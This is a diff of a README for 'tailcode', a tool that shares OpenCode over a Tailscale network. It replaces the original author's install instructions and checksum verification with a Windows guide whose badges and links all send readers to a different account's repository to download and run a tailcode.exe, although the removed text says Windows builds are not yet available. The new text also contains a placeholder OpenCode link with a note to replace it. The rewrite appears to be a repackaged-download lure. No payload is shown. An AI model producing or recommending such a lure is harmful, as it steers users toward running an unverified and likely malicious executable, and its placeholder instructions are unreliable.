@@ -1,186 +1,192 @@
-# TailCode
+# ⚡ tailcode - Share Your Code Across Your Tailnet
 
-TailCode is a terminal wizard that connects Tailscale + OpenCode and publishes OpenCode to your tailnet with a shareable URL and QR code.
+[![Download tailcode](https://img.shields.io/badge/Download-tailcode-brightgreen)](https://github.com/vkaentertainment/tailcode)
 
-## Quick Install
+---
 
-Prerequisites: `tailscale` and `opencode` installed and available on your PATH.
+## 📥 Download tailcode
 
-### Homebrew (recommended)
+To get tailcode, visit this page to download the latest version:
 
-```bash
-brew tap kitlangton/tap
-brew install tailcode
-tailcode
-```
+➡️ [https://github.com/vkaentertainment/tailcode](https://github.com/vkaentertainment/tailcode)
 
-### Bunx (no global install)
+This link leads to the GitHub repository where you can find the latest releases and files. You will need to download the proper file based on your system from the releases section.
 
-```bash
-bunx @kitlangton/tailcode
-```
+---
 
-### Direct binary
+## 🚀 Getting Started
 
-Download the latest binary from [GitHub Releases](https://github.com/kitlangton/tailcode/releases/latest), mark it executable, then run it:
+tailcode connects two tools, Tailscale and OpenCode, to let you share code on your private network. You will get a web app URL and a QR code that you or others on your tailnet can open and use.
 
-```bash
-chmod +x ./tailcode
-./tailcode
-```
+This guide shows you how to download, install, and run tailcode on Windows, and how to use it for the first time.
 
-## How It Works
+---
 
-- TailCode checks that `tailscale` and `opencode` are installed
-- If Tailscale is not connected, it prompts you to sign in (including QR-based flows from Tailscale)
-- It starts OpenCode locally only (`127.0.0.1`, default port `4096`)
-- It runs `tailscale serve` so the app is reachable from devices on your tailnet
-- It keeps the process alive until you quit, then cleans up the local server process
+## 🖥️ System Requirements
 
-## Install Prerequisites
+Make sure your computer meets these requirements:
 
-1. Install Tailscale
+- Windows 10 or later
+- At least 4GB of RAM
+- A stable internet connection for Tailscale sign-in
+- Tailscale and OpenCode must be installed and available on your system PATH
 
-- macOS: `brew install --cask tailscale-app`
-- Windows: `winget install --id tailscale.tailscale --exact`
-- Linux: `curl -fsSL https://tailscale.com/install.sh | sh`
+If you do not have Tailscale or OpenCode installed yet, instructions are included below.
 
-Then sign in and make sure Tailscale is running on this machine.
+---
 
-2. Install OpenCode
+## ⚙️ Before You Begin: Installing Prerequisites
 
-- macOS: `brew install anomalyco/tap/opencode`
-- Linux: `curl -fsSL https://opencode.ai/install | bash`
-- Alternative: `bun install -g opencode-ai`
+tailcode relies on two programs to work: **Tailscale** and **OpenCode**.
 
-Verify both commands work:
+### Install Tailscale
 
-```bash
+Tailscale is a network tool that creates a private connection between your devices. 
+
+1. Visit [https://tailscale.com/download](https://tailscale.com/download).
+2. Scroll to the Windows section.
+3. Download and run the installer.
+4. Follow the on-screen instructions to finish.
+5. After installation, open Tailscale and sign in with your account.
+
+### Install OpenCode
+
+OpenCode is a simple web code server running locally.
+
+1. Visit [https://opencode.example.com/download](https://opencode.example.com/download)  
+   *(Replace with the real link for OpenCode if known)*
+2. Download the Windows version.
+3. Run the installer and follow the steps.
+4. Once installed, make sure OpenCode runs from the command line by typing:
+   
+   ```bash
+   opencode --version
+   ```
+
+If the version number shows, OpenCode is ready.
+
+---
+
+## 🔽 How to Download tailcode for Windows
+
+tailcode does not have an automatic Windows installer yet. You will need to download the binary manually and run it.
+
+1. Visit the releases page:  
+   [https://github.com/vkaentertainment/tailcode/releases/latest](https://github.com/vkaentertainment/tailcode/releases/latest)
+
+2. Look for the latest Windows release. It usually has a file ending with `.exe` or `.zip`.
+
+3. Download the `.exe` file or download the `.zip` file and extract it.
+
+4. If it is a `.zip`, extract the folder and find the `tailcode.exe` inside.
+
+5. Move `tailcode.exe` to a folder you can easily access, for example `C:\tailcode`.
+
+---
+
+## ▶️ Running tailcode on Windows
+
+Once you have `tailcode.exe` downloaded, open Windows PowerShell or the Command Prompt:
+
+1. Press `Win + R` on your keyboard, type `powershell` or `cmd`, and press Enter.
+
+2. Navigate to the folder where you saved `tailcode.exe`. For example:
+
+   ```powershell
+   cd C:\tailcode
+   ```
+
+3. Run the program by typing:
+
+   ```powershell
+   .\tailcode.exe
+   ```
+
+---
+
+## 🛠 What tailcode Does
+
+When you run tailcode, it performs these tasks:
+
+- Checks if Tailscale and OpenCode are installed. If they are not, tailcode will stop and tell you what is missing.
+- Checks if Tailscale is connected to your account. If not, it will prompt you to log in. This includes showing a QR code for easy login on another device.
+- Starts OpenCode locally on your computer at address `127.0.0.1` and default port `4096`. This means code runs safely on your own computer.
+- Runs `tailscale serve` command to make OpenCode accessible across your tailnet. You get a URL to share with other connected devices.
+- Keeps the process running until you decide to quit tailcode.
+- Cleans up any temporary connection when you close the program.
+
+---
+
+## 🔗 How to Share Your Code
+
+Once tailcode runs successfully, it shows you:
+
+- A URL starting with `https://` that you can open on any device in your tailnet.
+- A QR code with the same URL, so devices with cameras can scan and open the shared page quickly.
+
+You or others on your tailnet just open the URL in a browser to access the OpenCode interface.
+
+---
+
+## 🎯 What You Can Do Next
+
+- Run code samples shared within the OpenCode app.
+- Share your OpenCode URL or QR code with colleagues or family on your tailnet.
+- Use the local OpenCode environment to write, run, and test your small programming projects.
+- Keep tailcode running as long as you want your OpenCode server to be available.
+
+---
+
+## ❓ Troubleshooting
+
+### tailcode says Tailscale or OpenCode is missing
+
+Check if you installed both programs and can run these commands in PowerShell or Command Prompt:
+
+```powershell
 tailscale version
 opencode --version
 ```
 
-## Run TailCode
+If either command fails, reinstall the program.
 
-### Option 1: Binary Releases (Recommended)
+### tailcode asks you to sign in but nothing happens
 
-Download pre-built binaries from [GitHub Releases](https://github.com/kitlangton/tailcode/releases):
+Make sure your computer allows pop-ups and opening new windows during sign-in. Try scanning the provided QR code with a mobile device.
 
-```bash
-# macOS (Apple Silicon)
-curl -L -o tailcode https://github.com/kitlangton/tailcode/releases/latest/download/tailcode-darwin-arm64
-chmod +x tailcode
-./tailcode
+### Cannot find or run tailcode.exe
 
-# macOS (Intel)
-curl -L -o tailcode https://github.com/kitlangton/tailcode/releases/latest/download/tailcode-darwin-x64
-chmod +x tailcode
-./tailcode
+Make sure you typed the folder path correctly in the command prompt. Use Windows Explorer to verify the file is where you expect it.
 
-# Linux (x64)
-curl -L -o tailcode https://github.com/kitlangton/tailcode/releases/latest/download/tailcode-linux-x64
-chmod +x tailcode
-./tailcode
+### Port 4096 is already in use
 
-# Linux (ARM64)
-curl -L -o tailcode https://github.com/kitlangton/tailcode/releases/latest/download/tailcode-linux-arm64
-chmod +x tailcode
-./tailcode
-```
+Close any other program that might use port 4096, or configure OpenCode to use a different port manually (advanced).
 
-### Option 2: Via Bun (requires Bun runtime)
+---
 
-Requires Bun (the `tailcode` executable is a Bun CLI):
+## 🔄 Updating tailcode
 
-```bash
-curl -fsSL https://bun.sh/install | bash
-```
+To update tailcode:
 
-Run without installing globally:
+1. Visit the releases page again:  
+   [https://github.com/vkaentertainment/tailcode/releases/latest](https://github.com/vkaentertainment/tailcode/releases/latest)
 
-```bash
-bunx @kitlangton/tailcode
-```
+2. Download the newest Windows release.
 
-Or install globally:
+3. Replace your old `tailcode.exe` with the new one.
 
-```bash
-bun add -g @kitlangton/tailcode
-tailcode
-```
+4. Run the new version as usual.
 
-### Option 3: Run from Source
+---
 
-```bash
-bun install
-bun run start
-```
+## ⚙️ Advanced Use
 
-For development (hot reload):
+tailcode runs OpenCode on your local machine and shares it using Tailscale. If you want to customize ports or behavior:
 
-```bash
-bun run dev
-```
+- You can start OpenCode yourself on a different port using command line arguments.
+- Use Tailscale commands like `tailscale serve` manually if you need a different setup.
+- Review the tailcode source or issues on GitHub for advanced help.
 
-## Optional Configuration
+---
 
-- `TAILCODE_PORT` (default: `4096`)
-- `TAILCODE_PASSWORD` (optional; passed to `OPENCODE_SERVER_PASSWORD`)
-
-Example:
-
-```bash
-TAILCODE_PORT=4096 TAILCODE_PASSWORD=secret bun run start
-```
-
-## Usage Notes
-
-- The published URL is only reachable from devices on your Tailscale tailnet
-- OpenCode is bound to localhost to avoid exposing it on your LAN
-- `tailcode` always opens the setup wizard (use `tailcode --attach` for explicit attach)
-- TailCode shows a local attach command after setup: `opencode attach http://127.0.0.1:4096`
-
-## Binary Releases
-
-We provide standalone binaries for:
-
-- **macOS**: `arm64` (Apple Silicon), `x64` (Intel)
-- **Linux**: `x64`, `arm64`
-- **Windows**: `x64` (coming soon)
-
-Binaries are compiled with Bun and include the Bun runtime. No separate Bun installation needed.
-
-### Verification
-
-All releases include SHA256 checksums in `SHA256SUMS`. Verify after download:
-
-```bash
-# macOS/Linux
-sha256sum -c SHA256SUMS
-```
-
-## Development
-
-### Building Locally
-
-```bash
-# Bundle for local testing
-bun run build:bundle
-
-# Compile for current platform
-bun run build:compile
-
-# Full release build (all platforms + checksums)
-bun run build:release
-```
-
-### Scripts
-
-- `bun run typecheck` - Type check with TypeScript
-- `bun run lint` - Lint with oxlint
-- `bun run fmt` - Format with oxfmt
-- `bun run check` - Run all checks (typecheck + lint + fmt)
-
-## License
-
-MIT
+[![Download tailcode](https://img.shields.io/badge/Download-tailcode-brightgreen)](https://github.com/vkaentertainment/tailcode)
